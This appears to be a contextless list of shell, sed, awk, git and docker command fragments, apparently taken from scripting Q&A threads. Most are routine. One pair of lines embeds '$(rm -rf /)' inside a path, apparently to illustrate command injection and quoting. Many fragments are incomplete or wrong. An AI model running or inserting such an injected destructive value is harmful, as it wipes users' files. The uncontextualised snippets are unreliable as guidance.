command 2>&1 3>&1 > file.txt
command <mystery operator> cat
docker run
docker exec
tailf -f
man ruby
ruby -n
man ruby
chmod ug+x sum.rb
cat data.txt | ./sum.rb
./find_parent_server.pl container10
ssh -t -l $username $hostname
cat $HOSTS_FILE
gcc -S
.bashrc or .bash_profile
terminal > preferences > startup script
<true/> to <false/>
sub(/,/, "[^,]*&", s)
wait $!
sudo docker build -t myService .
sudo -S docker run -d -name myService myService
sudo -S docker run -d -name myService myService
exec(String command)
exec(String[] cmdarray)
data {
grep metric
sed -n 2~4p
sed -r 's/^\s+//'
cut -f2 -d' '
sed 'N;s_\n_ / _'
bc -l
-F '[],[]'
-v RS=" "
echo ""
> /dev/null
inputfile = open(infile, 'r')
path = '/csvs/'
source /path/to/file
tar -xz --exclude-from='exclude.lst' -f backup.tar.gz -O - | tar cfv backup.tar -T -
tar x -O
tar --delete
zcat | tar --delete
./script <filename>
env | grep AWS_
aws s3 ls
jq .Blah
export AWS_ACCESS_KEY_ID=$(echo $temp_role | jq .Credentials.AccessKeyId)
export AWS_ACCESS_KEY_ID=$(echo $temp_role | jq -r .Credentials.AccessKeyId)
aws configure --profile new-profile set source_profile default
aws configure --profile new-profile set credential_sourceEc2InstanceMetadata
aws configure --profile new-profile set credential_source EcsContainer
aws --profile new-profile s3 ls s3://bucket-in-target-account
mv file.xxxxx idvalue.xml
setup channel1 output #std{access=udp,mux=ts,dst=239.192.174.105:1234}
echo $MY_VARIABLE
/root/Desktop/local test/list.csv
<%= path %>
<%= path %>
source /root/config/bashrc.sh
command not found
| "(" grep ... ")"
set ( something "\(" )
sh -c
service asterisk start
sed 's/\.\([^,]*\) M/\1000000/' YourFile
set -x
"1 2"
for f in ${in[@]}
fold -50
fold -200
adduser --username="foo" --password="bar"
remove --username="foo"
changepass --username="foo" --password="bar"
command parameter="" parameter=""...
adduser --username="foo" --password="XXXXX"
remove --username="foo"
changepass --username="foo" --password="XXXXX"
echo "${value%password=*}password=XXXXXX" >> somelog.log
echo "${value/password=\"(.*?)\"/password=xxxxx }" >> somelog.log
cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1
nova list
[ -n "string to check" ]
echo $((byte ^ char))
python fname_function.py "$reach" "$drive" "$dte"
command > filename
find -exec
find . -print0 | xargs -0
tmux attach
myfunction arg1 arg2 "this is arg3"
myfunction arg1 arg2 "this is arg3"
is arg3
this is arg3
this is arg3
otool -L /path/to/executable
ldd -r /path/to/executable
\Connector port="\d{4}" protocol="HTTP\/1.1$\
ls -t -d */
knife client edit
knife client
DW_AT_type        : <0xb8>
echo "$answer"
export answer
./supload.sh -u USERNAME -k PASSWORD -r dest_dir/ src_dir
cd newpath
file directory/*
file directory/foo directory/bar directory/baz
cd ..
find -name "hello.txt"
xxd <<< ""
found=$(echo; find …)
-printf "%p\n"
-u, --utc, --universal
kill -0 %1
kill -0 %1
kill -0 $!
rm \ *
which test
type -a <cmdname>
man type
man bash
printf -v
dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
"$(dirname -- "$(dirname -- "$dir")")/foo/bar"
echo $$ | command
screen -S session -X stuff "echo $$ | command\n"
echo 7589 | command
"foo "'something'" bar"
tail -n +2 |
test -f
[ -f X ]
[[ -f my_file ]]
[ -f my_file ]
xargs -P
xargs -P
ls | grep ^[0-9][0-9]" -"
for i in ``ls | grep ^[0-9][0-9]" -"``;do echo $i; done
01 -
Eagles -
while read
find ./ -print0 | perl -0 -n -e 'print "$_\n" if /[0-9][0-9] -/;'
'foo*.mp3' 'bar#1.mp3'
Eagles -
shopt -s extglob
psswd() { LC_ALL=C tr -dc 'a-zA-Z0-9-!"@/#$%^&*()_+~' < /dev/urandom | head -c "$1";echo ;}
psswd n
od -An -N1 -i /dev/random
stdbuf -o0
man 5 crontab
Error: libdc1394 error: Failed to initialize libdc1394
RUN ln /dev/null /dev/raw1394
docker run -it ...
ln /dev/null /dev/raw1394
CMD sh -c 'ln -s /dev/null /dev/raw1394'; <your-script-here>
docker-compose up
docker-compose run --rm app bash
bash -c
-exec rm ..
bc -l
( )
bash -c
bash -c "pgrep -f blah"
sh -c "pgrep -f blah"
awk -f' '
| column -t
awk -F' ' -vcols=pkts,bytes,source,destination '(NR==2){n=split(cols,cs,",");for(c=1;c<=n;c++){for(i=1;i<=NF;i++)if($(i)==cs[c])ci[c]=i}}{for(i=1;i<=n;i++)printf "%s" FS,$(ci[i]);printf "\n"}' | column -t
iptables -L -n -v --line-numbers
$k -eq 0
set -x
$(cat file)
$(< file)
source= 'tmp1/test/'
ls -F
{ }
grep: a.txt
grep: b
grep magenta * -exec rm '{}' \;
xargs -0
rm -f
| xargs -0 rm -f --
-v n=20
-v RS='[.?!]'
if (length(s $0 RT)>n) exit; else s=s $0 RT
END{print s;}
echo "#!/usr/bin/env bash" | sed 's:#!/usr/bin/env bash:#!/bin/bash:g'
sed 's:#!/usr/bin/env bash:#!/bin/bash:g' <inputfile >outputfile-new
<test.txt >test-new.txt
[ ]
vim .bashrc
runtime! debian.vim
3 Aug...
Mon, 3 Aug 2015 08:45:18 GMT
date --date="2 hours ago 5 minutes ago" +%s
date -Rr $filename
man strftime
system("sh /full/path/to script")
print "running";
[[ ... ]]
[ ... ]
/bin/bash --version
cp fileA.py fileB.py
cat fileB.py
stat -c "%a %n" *.py
chmod 777 fileB.py
man top
-n 1
while read
lcd $HOME/temp
find "$dir"
find .
... bad substitution
1 < P <= N
page-1 ... page-(P-1), page-(P), page-(P+1)... page-N
addPage() P
1 < P <= N
Page has been added at 'P'
remove_page() P
(1 < P <= N)
removePage() P
1 < P <= N
git initialized
mkdir -p
ls -l
git commit
"Rows Fetched"
modman init
modman: command not found
"0x" substr($1,5,2)
strtonum("0x" substr($1,5,2))
$(( ... ))
find "./" -not -type d -maxdepth 1 -iname "*.jpg" -print0 | while IFS= read -r -d $'\0' fileName ; do { echo "$fileName"; }; done; unset fileName;
deppfx@localhost:/tmp$ echo ${$(hostname): -3}
-bash: ${$(hostname): -3}: bad substitution
${variable: -3}
meteor add telescope:posts
export http_proxy = ""
export https_proxy = ""
source file.sh
. file.sh
touch config/strategies/local.js config/strategies/facebook.js config/strategies/twitter.js
date +"%T.%N"
date +"%T.%6N"
date +"%T.%3N"
echo "1" | grep 2
echo "1" | grep 1
echo "1" | grep 2 | echo $?
echo "1" | grep 2 && echo "0" || echo "1"
history | more
print $2, $3
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
sudo -s
read -s
wc -l
grep -v
man cut
unknown option to s'
unterminated s' command
-v, --invert-match        select non-matching lines
-type f
find … | xargs
MODEL X
__git_ps1 " (%s)"
bash: runmqsc: command not found
[[ $1 = -h || $1 = --help ]]
-v h=99
h>$3{if (last) print last;print;}
END{print last}
set -e
set -o errexit
set -e
set -o errexit
! pipeline
git show --format="%ci %cr" master | head -n 1
GET /repos/:owner/:repo/branches/:branch
$ open -a SublimeText.app ./My_project/my_example.cpp
$ alias sublime='open -a SublimeText.app'
ln -s
cat myfile.csv | sort -t, k2 |uniq -c
#XPERCHAN: 0.0200000
GNU Parallel
GNU Parallel
GNU Parallel
man <youralias>
grep -P
exit 1
1 && 2 || 3 && 4
1 && 2
git ignored
fatal: bad config file line 18 in ~/.gitconfig
sed s/^(.*)$/z\1z/
sed -e s/^/z/ -e s/$/z/
bad config file
git config
" "
' '
git config
git alias
git config
uni-directional communication from all the C/C++-daemons and scripts to central error handling C/C++-daemon
fgrep -v
( )
(?: )
[[ ]]
[[ $string =~ [a-z]|[a-z][-a-z]*[a-z] ]]
-rm /tmp/blah*
bash -c '...'
export variable="$(tail -n 2 /source.txt)"
-exec ... +
uname -m
#Field list ...
echo "$error"
printf "$error"
select email from table2 where invoice_id in (select invoice_id from table where country = 'it');
-lt, -eq
echo $((c))
man bash
brew linkapps
brew linkapps
for loop
user@host:~/Documents/Code$ grep -rli whatever ./
"grep -rli whatever ./"
print "\r\e[#{lines}A"
[Wed Aug 05 20:49:43 deppfx@localhost:~] $xdotool type password
password[Wed Aug 05 20:50:51 deppfx@localhost:~] $password
xdotool selectwindow type password
tput el1
cut -f
grep -m 1 "enclosure"
cut -d " " -f 3
12345 23456
cat -n
echo "123" | grep '[0-9]+'
echo "123" | grep '[0-9]\+'
echo "123" | grep '3|4'
grep -E
man grep
git branch --list --contains
git for-each-ref
git merge-base
git for-each-ref --no-contains <SHA1>
git for-each-ref
git tag -l
git branch -l
git for-each-ref
man grep
cd {$num}_1000_solar
sort -k 2
ls -lt
scp me#comp:/~/blah.text ep#comp:/register/
9.626 0.262 8.266
-r -d ''
-a array
-d ''
print "" > "out.log"
grep -q
grep -q yes
grep -vq yes
until grep -vq yes
00012.png, 00013.png, 00014.png
00001.png, 00002.png, 00003.png
00012.png 00013.png 00014.png
cd $GOPATH
<p class="text-muted">&copy; 2014. Core Team</p>
<p class="text-muted"><p class="text-muted">&copy; 2014. Core Team</p>copy; 2015. Core Team</p>
sed "s|$s1|$s2|g" file1.txt
ENABLE_DEBUG = YES
find . -type f -name '*.*' | sed 's|.*\.||' | sort -u
png: 140
-c, --count
[[ ... ]]
at now
domainjoin-cli join $domain $join_account $password
<cmd> > output.txt
df -h /var/www/
du -sh file_path
mkcd foo
1,5 d
tail -n +6
head -n -1
help ulimit
dmesg -n -1
docker stop
Caught SIGTERM signal!
awk '{ system("kill -15 " $1)}'
docker stop
jobs -p
fuser -n tcp {port-number}
kill -9 {PID}
fuser -n tcp {port-number}
kill -9 {PID}
./killProcess 25565
service opsware-sas restart opswgw
\<exit [0-9]+
exit <digits>
cat -n
Example \%^ $variable ${array[$element]}
\E\x\a\m\p\l\e\ \\\%\^\ $variable\ ${array[$element]}
echo $(echo $string | sed -r -e 's/(.)/\\\\\1/g')
find /some/directory -type f -mmin -10 -deletedFilesOnly
debugfs /dev/hda13
df /
debugfs -R "ncheck 320236"
DEL_SCAN_ORIG_AMOUNT=$(find /some/directory -type f | wc -l)
DEL_SCAN_NEW_AMOUNT=$(find /some/directory -type f | wc -l)
DEL_SCAN_DEL_AMOUNT=$(($DEL_SCAN_ORIG_AMOUNT - $DEL_SCAN_NEW_AMOUNT));
if [ $DEL_SCAN_DEL_AMOUNT -gt 0 ]; then echo "$DEL_SCAN_DEL_AMOUNT deleted files"; fi;
cat -v yourscript
dos2unix yourscript
cat yourscript | tr -d '\r' > fixedscript
tr -d '\r'
screen -S cs ./srcds_run -game csgo -usercon
sv_cheats 1
bash myscript
myscript: line 4: syntax error near unexpected token `fi'
myscript: line 6: syntax error: unexpected end of file
myscript: line 4: syntax error near unexpected token `$'\r'
cat -v yourscript
dos2unix yourscript
cat yourscript | tr -d '\r' > fixedscript
pkill -P $$
C-u M-x emacs-version
mipinfo () {...}
-v OFS==
$1 == "server-port"{$2++}
"a b   "
"a   "
-d 2h
-d -f
-d 2h -f file.txt
-d 2h -f
echo $last_flag
sudo visudo
sudo nano /etc/profile
sudo nano /etc/login.defs
sudo nano /root/.bashrc
sudo nano /etc/environment
#grep -i "personName" attendF | cut -t"," -k2,2 > mnthFile
! -z
sort -nk1
((${#array[@]} < something))
root EUID
"$fp "+pcr+" "+dat
print "\xC8\xCE\xC5\x06"
python -c "print 'Hello World'"
man python
u"\xC8\xCE\xC5" == u"ÈÎÅ"
cd $(my-program $1)
ip route get
ip route get
rm -r test-website/css
rm -r test-website/css/
rm -Rf ~/workspace/test-website/css
rm -rf ~/workspace/test-website/css
rm -R ~/workspace/test-website/css
grep: conflicting matchers specified
in $yesterday_logs $today_logs
command 2>/dev/null
grep -q OK 2>/dev/null
module load intel
a bcd "ef gh" "   ijk   "
"a", "bcd", "ef gh", "   ijk   "
" ijk "
"ef gh"
ef\ gh
chmod 755 my_script.sh
chmod +x my_script.sh
chmod 755 filename
chmod +x file_name
sudo -S
bash -c
bash -c
man bash
Here Documents
"cd; pwd"
man sudo
touch test
eval $command
#  second-setting = off
cat settings.conf | sed '/^# second.*/ {s/^#//;s/off/on/}'
awk -F ' ' '{print $1}'
VboxManage showvminfo
sudo -k
awk -F","
<?php echo shell_exec("echo 'a' > /tmp/4.txt");?>
<?php echo shell_exec("echo '2a' > /tmp/5.txt");?>
<?php echo shell_exec("echo '>a' > /tmp/6.txt");?>
<?php echo shell_exec("echo 'a;' > /tmp/7.txt");?>
<?php echo shell_exec("echo '&a' > /tmp/8.txt");?>
<?php echo shell_exec("echo .escapeshellarg(&a) > /tmp/8.txt");?>
/home/folder1 /folder2 /xyz.sh
home/folder1$ ./folder2/xyz.sh
mount_webdav -i "http://<ip-address>:80/Path/" "/Path/To/mntpnt/"
mount_webdav -i "mount_webdav "http://<windomain>;<username>:<Password>@<ip-address>:80/Path/" "/Path/To/mntpnt/"
printf '%s' "$output"
make -n
FILE *pipe = popen("echo $(ffprobe ...)");
"hi "    "world"
"hi world"
using namespace std;
using std::name;
using std::string;
using namespace xxxx;
$( ./script )
$( )
command not found
source "${HOME}/.bashrc"
ASSERT:expected:< 1↑> but was:< 1↑>
printf -v varname_quoted %q "$varname"
printf %q "$varname"
transfer -s 3 -- ep1#path/to/dir/ ep2#end/point/ -r
man bash
[[ -n $1 ]]
[[ -n $1 ]]
[ -n "$1" ]
echo "/linuxcoe *" >> "$myConfigFile"
while read ... done <inputfile
while read ... done <file
read filename count
yo: command not found
npm install -g yo
/usr/local/lib/node_modules yo
/usr/local/lib/node_modules yo aspnet
-bash: /usr/local/lib/node_modules: is a directory
-d ''
echo $foo
echo "$foo"
awk -F"\t" '$2 ~/-/ {print}' Input_file
homebrew install homebrew/x11/meld
brew link --overwrite python
which python
which meld
which meld
which meld
brew install python3
ssh user@host yourCommandToRunWithoutPty
ssh user@host sudo iptables --some-iptables-switches
perl perlscript.pl
Binary file (standard input) matches
grep --text -v '^$'
wc -l
[ -f $file ] && echo "foo exists!"
[ -f $file ] && echo "foo exists!"
sed '/\\N/d'
sed '/\\N/d'
LC_ALL=C grep -vF '\N'
tail -n 1
export PATH="${PATH}:/usr/local/bin"
bash -c
data [ first column ]
data [ 1st column ]
sed '1i..'
wp scaffold plugin-tests my-plugin
bash bin/install-wp-tests.sh wordpress_test root '' localhost latest
wp --info
conection refused
ServerName localhost
System Preferences -> Sharing -> Remote Login box (check it)
Allow network access
Loaded Configuration File
not OK
~/Library/Android/sdk/platform-tools/adb shell input keyevent 82
~/Library/Android/sdk/platform-tools/adb shell am start -a android.intent.action.VIEW -d http://www.stackoverflow.com
find /Development/temp_try ! \( -path $excom \) ...
-exec grep
git status
cd root.git
git branch
git log
npm install
read -A
read -a
tr -s ' ' | cut -d ' ' -f3,6
ps -ef
for word in $filename
std::system("cygwin/bin/bash -c \"command_string...\"")
printf %q
'$(rm -rf /)'
cd ~/test/emane/gvine/node-$(rm -rf /)
printf %q
printf %q
printf %q
printf %q
sudo bash
parameter expansion
command substitution
parameter expansion
sed -i "s/$badpath/$goodpath/g" file
print "\033[31m red text \033[0m"
print "\[\033[31m\]"
echo -e
Windows 7
Git Bash
git help <command>
git help checkout
expr match
expr match
if [ -n "$MSYSTEM" -a ${BASH_VERSINFO[0]} -lt 4 ]
grep -q
double precision
rails new app
rvm use 2.2.0
/bin/bash --login
supervisorctl reread
-maxdepth 1
-type f
man test
sed -E "s:([^[:alnum:]_]|^)a:\1A:g; s:([^[:alnum:]_]|^)b:\1B:g; s:([^[:alnum:]_]|^)c:\1C:g; s:([^[:alnum:]_]|^)d:\1D:g; s:([^[:alnum:]_]|^)e:\1E:g; s:([^[:alnum:]_]|^)f:\1F:g; s:([^[:alnum:]_]|^)g:\1G:g; s:([^[:alnum:]_]|^)h:\1H:g; s:([^[:alnum:]_]|^)i:\1I:g; s:([^[:alnum:]_]|^)j:\1J:g; s:([^[:alnum:]_]|^)k:\1K:g; s:([^[:alnum:]_]|^)l:\1L:g; s:([^[:alnum:]_]|^)m:\1M:g; s:([^[:alnum:]_]|^)n:\1N:g; s:([^[:alnum:]_]|^)o:\1O:g; s:([^[:alnum:]_]|^)p:\1P:g; s:([^[:alnum:]_]|^)q:\1Q:g; s:([^[:alnum:]_]|^)r:\1R:g; s:([^[:alnum:]_]|^)s:\1S:g; s:([^[:alnum:]_]|^)t:\1T:g; s:([^[:alnum:]_]|^)u:\1U:g; s:([^[:alnum:]_]|^)v:\1V:g; s:([^[:alnum:]_]|^)w:\1W:g; s:([^[:alnum:]_]|^)x:\1X:g; s:([^[:alnum:]_]|^)y:\1Y:g; s:([^[:alnum:]_]|^)z:\1Z:g;"
1 that 1 nye
:ConqueTerm bash
/usr/bin/mongod &
declare -x
|| [[ -n "$line" ]]
sed 's/^$/Hello/' file1
sed 's/^$/Hello/' file1 > file2
sed -i 's/^$/Hello/' file1
copy the last 80 lines
tail -80 filename.txt > newfilename.txt
eval "declare $CURRENCY[${TARGETCURRENCY}]=\$(echo \${$CURRENCY[USD]}/\${$TARGETCURRENCY[USD]} | bc)"
php artisan collect-tweets
Exited too quickly (process log may have details)
some text
ssh -tt localhost sudo somecomand ...
expect -c "spawn sudo somecommand; interact"
screen sudo somecommand
sky sport
DE: Bundesliga
'/NL:|DE: Bundesliga/,+1p'
DE: Bundesliga
/sky sport/I
echo "1"&& echo "2"&& echo "3"
man bash
shopt -s lithist
sed '$d' $file >> $consolidatedCSVFile
tail -2 $file | head -1 > $consolidatedCSVFile$lastLines/$(basename $file)$lastLine
sed: -e expression #1, char 26: unknown command: 'X'
1439459065780,5,SOAP/XML-RPC Request,200,OK,ws test 1-3,text,true,267,3,3,5
sed '1,/^'"$availableLastLine"'$/d' $file  | sed '$d' >> $consolidatedCSVFile
availableLastLine=$(sed 's/\//\\\//' $consolidatedCSVFile$lastLines/$(basename $file)$lastLine)
echo "I eat " < cat poo.txt
I eat 42
-bash: cat: No such file or directory
arr=$(echo $IN | tr "." "\n")
source /etc/environment
printenv SECRET_KEY
source /etc/environment
sudo -H -u edxapp bash
sudo -H -u edxapp bash
edxapp user
sudo -H -u edxapp bash
-c myRemainingScript.sh
git pull
(git pull &)
evalInput "exit"
shunit2:WARN trapped and now handling the (TERM) signal
help declare
declare -a
exists, please continue
bash jag32.sh
bash jag32.sh textfile.txt
wc $CARFILE
bash jag32.sh
bash -x
-f FILE
windows shell
command interpreter
<artist mbid="eaefd603-84c1-4db4-a72b-0cb718a0cc07">Chelsea Wolfe</artist>
grep -Po '(?<=<artist mbid=.*?>).*?(?=</artist>)'
( )
find directory1 directory2 -name \*.txt -printf '%f\n'
sort | uniq -u
uniq -d
xargs -I{} find directory1 directory2 -name {} -delete
process substitution
export PS1="${COL1}\u: ${COL2}\w${COL3} \$(git branch 2>/dev/null | grep '^*' | colrm 1 2)${NCOL} > "
colrm 1 1
colrm 1 2
* master
sed 's/$/ /'
git branch
sh: 2: Syntax error: Unterminated quoted string
sed -i 's/string_catcher/new_string/g'  <file_name>
sed 's/string_catcher/new_string/g'  <file_name> > <file_name>
. /etc/bash_completion
cmd --param=<TAB>
env -i bash --norc
complete -r -D
curl --data-urlencode
curl --data
rm *
cannot remove 'XXXXX': is a directory
find -type f
cat results.txt
printf "%s\n" line{1..3}
echo Ctrl+G
sed 's/"'$i'"/ARNOLD/g' test1.log>test2.log
while read i
while IFS= read -r i
sed -i
export PATH="/usr/local/bin:$PATH"
export PATH="/usr/local/bin"
source /etc/profile
<<<agent created>>>>
tr -d '\r' < input.txt > fixed_input.txt
array1[1] - array2[1], array1[2] - array2[2]...
for torrent in $WF_LIST
ssh -i ... usr@svr.dom bash --init-file osx_remote -i
man test
-F <(… php code here …)
Could not find an activated virtualenv (required).
-bash: /Users/me/virtualenvs/r: is a directory
python3 -m venv myPython3Env
{% extends "file.txt" %}
if [[ "$line" =~ "$EXTENDS_REG" ]]
if [[ "$line" =~ $EXTENDS_REG ]]
if [[ "$line" =~ '{%\s*extends\s*".*"\s*%}' ]]
if [[ "$line" =~ '{%\s*extends\s*"'$FILE_REG'"\s*%}' ]]
if [[ "$line" =~ {%\s*extends\s*\".*\"\s*%} ]]
$( )
emacs .bash_profile
HH MM SS MM DD YYYY
\4 \5 \6 \2 \3 \1
crontab -l
git rm --cached .DS_Store
echo $name
echo "$name"
for file in $(ls /path/to/*.dat)
for c in $(awk ...)
for a in $(ls /usr/cycle1/sample/*.dat)
for a in /usr/cycle1/sample/*.dat
export PATH=~/.rbenv/bin:$PATH eval "$(rbenv init -)"
export PATH.....
ps -e -o %cpu
tail -n +2
sort -r
head -n 1
cd /path/tofile/
gcc -o main file.cpp
gcc -o main *.cpp
echo $someRecords >> "$DATA"
$ch == [0-9]
fromdate = /user/manishs/Oozie/filter.sh
exec {newfd}>&-
last_command() { history | tail -2 | sed -n '1s/^ *[0-9] *//p' ;}
set -o history
grep -n
free -s4 | cut -c67-,56-61
:help syntastic-checker-options
let g:syntastic_php_checkers = ["php", "phpcs", "phpmd"]
-d _
-f 2
repquota -a
Syntax error: "(" unexpected
echo $0
bash ./script.sh
sh ./script.sh
export POSIXLY_CORRECT=1
echo $car
if grep
No such file or directory
printf "${a}" | wc -c
echo -en "${a}" | wc -c
systemctl --type service | cut -d " " -f 1
ls -l
dup2(childStdout[1], 2)
sh.exe:  command not found
tr -d '\r\n'
grep -v <something that appears in the file>
find | while
man bash
git difftool --tool-help
git difftool
git difftool -t winmerge(or WinMerge)
git config merge.tool winmerge
git config diff.tool winmerge
git mergetool
git difftool
grep 'Vauxhall' $CARFILE > output/Vauxhall_Cars.txt
Vauxhall | White
ls -l | grep 'TRAN' | awk '{print $9}'
ln -s
coffee --watch --compile -p myfile.coffee > .coffee.myfile.js
>CAM_* /sample_name=*
echo $?
man ps
paste -sd+ | bc
mktemp -d -p
sudo apt-get install -y gcc
sudo gem source -a http://rubygems.org/
Do you want to add this insecure source? [yn]
yes | gem source -a http://rubygems.org/
date -d $DATE
s/:.*/: $newname/
sed: 1: "file.yml": extra characters at the end of p command
-i …
-i '' …
sed: 1: "file.yml": extra characters at the end of p command
sed -i /something/ file.yml
crontab -l
crontab -l
0 */3 * * * ~/scripts/snapshot.sh
0 */3 cronjobs scripts test.sh cronjobs scripts test.sh cronjobs scripts test.sh ~/scripts/snapshot.sh
else if
'/path/foo' '/path/Rock Lobster - B-52'\''s.mp3'
/path/foo '/path/Rock Lobster - B-52'\''s.mp3'
if [ 2 -le "$LineNum" ]
cut -c
declare -A
declare -a
set -u
set -o nounset
map: unbound variable
declare -iA
(( newnum = num + offset ))
bash: data/*: ambiguous redirect
g++ app.cpp -o app && time ./app && du app
readlink -f
/path/to/script &
'database' => 'localhost'
'database' => 'new_database'
'database' => 'localhost'
GNU Parallel
while read var
ssh demo@111.1.111.101 "ssh user@test-server; cd deploy; ./deploy.sh"
awk -F: '$3=="1994"' | awk -F: '$3<="1999"' $CARFILE > output/1994-1999.txt
ctrl + D
bash myScript.sh carslist.txt
Just noticed that a record of 1993 has slipped through the cracks, is there a way of formatting the dates in the line above so it's only between 1994-1999?
grep 'Vauxhall' "$CARFILE"
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies
51000 102000 204000 312000 ...
Total:  3266 #015
spawn ssh
wc -l
-maxdepth 1
> file
O_TRUNC | O_WRONLY | O_CREAT
printf %q
exec 3>file
awk '{print ${1..14}' text_file
echo -n
man find
docker run
docker run
echo filename
oscmd_display= "echo \"" + oscmd + "\""
open('/dev/null', 'w')
--recover --html
2> /dev/null
Here Documents
man bash
Here Documents
cat file | awk '/[,][0-9]+$/'
strings typescript
sudo su
open  ~/.bash_profile
export ANDROID_HOME=/Users/boblikesoup/.meteor/android_bundle/android-sdk
export PATH=$ANDROID_HOME/tools:$PATH
export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
ssh user@B 'scp ./file user@C:'
paste - - -
s/\n/ /g
subprocess.call("script.sh", shell=True)
chmod u+x script.sh
subprocess.call("/complete/path/script.sh", shell=True)
,United States,1$
call(['bash', 'run.sh'])
map({key, value: .value[]})
map([.key, .value])
mv output_file.txt input_file.txt
GNU Parallel
GNU Parallel
ls | ./script.sh
cat | ./script.sh
Amazon Linux
service scriptname start
./configure --prefix=/homedtic/gsantamaria/parallel
make install
bash: parallel: command not found
make install
make install
/usr/bin/install: cannot create regular file /usr/local/bin/parallel': Permission denied
make install
conda install -c conda-forge parallel
go project1
cd project1
bash_script = "./testBash.sh"
bash_script = "./testBash.sh test test"
bash_script = "./testBash.sh"
bash_script = "./testBash.sh test test"
"./testBash.sh test test"
'test test'
FNR==NR {a[$NF]; next}
!($NF in a)
man awk
partial match
grep -v "abc"
grep -v "abc" file.txt
line three def
GNU Parallel
Fatal error: cannot open file ':::': No such file or directory
my @files
my @sorted
-k 3
> file
: > file
man zshmisc
REDIRECTIONS WITH NO COMMAND
> file
> file
: > file
: > file
> file
cat > file
> file
s/[ "]//g
/usr/bin/kill -s INT
Yellow & Blue
Yellow &Amp; Blue
./yourFileName.sh inputValue
[[ $var =~ ^[0-9]+$ ]]
pattern substitution
cd your_specific_directory
chmod +x name_of_your_script
cd ~/code/devtools/deploy-mix
sh_auto_file="C:\Program Files\Git\git-bash.exe" --no-cd "%L" %*
"%1" %*
"C:\Program Files (x86)\Git\bin\sh.exe" "%1" %*
o pid,pcpu,pmem,cmd
2> file
ls ... 2>/dev/null
/Users/ozan/Dropbox/Graphic Library/Google
DOCKER_USER=XXX DOCKER_PASSWORD=XXX config/docker/docker_hub.rb "NAMESPACE/REPO" "TAG" && echo 'latest'
git rev-parse --symbolic-full-name --abbrev-ref HEAD
gcloud auth configure-docker gcr.io
2014090914      ; serial, todays date+todays
set -x
bash -x myscript.sh
+ rsync -vvaumrhhhsq --info=name1 --delete --modify-window=2 --safe-links --progress --exclude-from=/home/me/backup/rsync/exrsync
'--exclude-from="$excl"' '--log-file="$logfile"'
/home/me '/My Backup/home/'
+ rsync -vvaumrhhhsq --info=name1 --delete --modify-window=2 --safe-links --progress --exclude-from=/home/me/backup/rsync/exrsync
--exclude-from=/home/me/exrsync-gh --log-file=rsync_home.log
/home/me '/My Backup/home/'
PREFIXaa, PREFIXab
man split
nohup <your command here> &
ssh $user@$server /bin/bash
gitb clone
git clone
command not found
-bash: /Users/Myself/.gitconfig: Permission denied
open "$HOME/.gitconfig"
$EDITOR $HOME/.gitconfig
vim ~/.gitconfig
"hello bro"
"hello\ bro"
"...".gsub /\s/,'\\ '
cat curl-cmd.txt | sh
Use \"
She said "Yes I Do"
Use '\''
My Daughter's dog likes cat treats  
sleep 2
read -r
jq '.[] | (.name)' jobs
some-command <<whatever
$(basename ${fa})
$(($(date +%s%N) - ${SERVICE_DURATION} * 1000000000))
sleep 30
[[ ]]
if ($env == 'trusty-ssd')
if ($env == 'trusty-ssd')
read -rs -n1 -a key
sort -u
grep -P
-F ''
grep -o .
sort -u
paste -s -d '\0' -
ls "*" 2>&1 | tee ls.txt
ls "*" | tee ls.txt
ls "*" 1>&2 | tee ls.txt
ls '*'
ls "*" 2>&1 | tee ls.txt
ls 2>&1 "*" | tee ls.txt
timeout 60 while read id; do find . -name $id -exec echo '{}' \;; find . -name ${id}-other -exec echo '{}' \;; done < <(grep foo foo.txt | awk '{print $1}')
bash -c
set --
, and
declare -p
chmod +x myprog
./myprog <yourdatafile
cp -R /path/*.mp3
alias rm="rm -i"
rm *
a | b | c
a > file; b < file > file2; c < file2
tac | tac
sed 's/h/m/'
$ python manage.py runserver
$ python manage.py runserver
python manage.py runserver
source .bashrc
windows directory structure
f.txt f2.txt list1
$(<command in subshell here...>)
git rm
git ls-files --deleted
git rm
git add --all
git log --name-status
git diff HEAD^ --name-only
xclip -o
bash -c
info sed
-v RS='[0-9]+ \\([^)]+\\) [0-9]+ [0-9]+'
lower case
man bash
ip link add dummy0 type dummy
docker ps
docker inspect
docker run
-v /var/run/docker.sock:/var/run/docker.sock
cat ~/.bash_history
bash bot.sh
syntax error: unexpected end of file
bash bot.sh
wc -l
FNR > 1
/ - \ |
find . -type f -exec grep -Hn 'TEXT' {} \;
python script.py < test.txt
git-bash -l -c bash
echo 'kill -KILL $SSH_AGENT_PID' >> .bash_logout
$git version
git version 2.20.1.windows.1
windows 7
git config
git mergetool
git difftool
git bash
git bash
removed file conflict
git difftool
git version 2.17.0.
git difftool --tool-help
git difftool
git mergetool
git difftool
git mergetool
git init
exit status
-bash: [: 0FILE: integer expression expected
b.export TESSERACT_PATH=${PWD}/external/tesseract-3.01
C:\Program Files (x86)\Tesseract-OCR
bash -c 'echo "core_%e.%p" > /proc/sys/kernel/core_pattern' > /dev/null 2>&1
osascript -e
System variables
./mac_check -m 00:00:00:00:00:00
./check_mac -m 001d.4eb5.d410  **or**  001d4eb5d410  **or**  00-1d-4e-b5-d4-10
IFS='|' mergedLines="${someArray[*]}
$(cat t1.txt t2.txt)
< <(cat t1.txt t2.txt)
cat t1.txt t2.txt
tac t2.txt t1.txt
exit 113
man bash
help -m exit
exit $?
PermitRootLogin {any_value}
sudo sed -i "/PermitRootLogin/c\PermitRootLogin no" /etc/ssh/sshd_config
sed -i "\(^[\# ]\)+/PermitRootLogin/c\PermitRootLogin no" /etc/ssh/sshd_config
sed: -e expression #1, char 48: unterminated address regex
PermitRootLogin no
sed -i -e 's/<Codec>/<inm:Video-codec>/g;s/<Duration_String4>/<inm:D-Duration>/g;s/<Width>/<inm:Width>/g;s/<\/Codec>/<\/inm:Video-codec>/g;s/<\/Duration_String4>/<\/inm:D-Duration>/g;s/<\/Width>/<\/inm:Width>/g;s/<FileExtension>/<inm:Wrapper>/g;s/<\/FileExtension>/<\/inm:Wrapper>/g' "$1"
tail -f mypipe
IOError: [Errno 29] Illegal seek
date +%Y
date +%y
ls -v *.mkv
ls -v *.mkv
echo $i
ls *.mkv
for i in *.mkv; do ...
phpunit classes/AdTest.php
git clone
composer install
